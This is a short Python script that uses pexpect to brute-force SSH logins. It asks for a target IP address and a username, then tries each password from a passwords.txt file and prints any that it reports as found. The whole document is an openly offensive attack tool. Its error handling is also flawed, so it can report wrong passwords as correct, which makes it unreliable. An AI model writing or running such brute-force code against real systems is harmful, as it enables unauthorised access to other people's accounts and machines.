#!/usr/bin/python3

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to connect?'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error...')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child
    
def main():
    host = input("Enter IP Address of Target to BruteForce: ")
    user = input(" Enter User you want to BruteForce: ")
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        try:
            child = connect(user, host, password)
            print('[+] Password Found: ' + password)
        except:
            print('[-] Wrong Password ' + password)
main()    
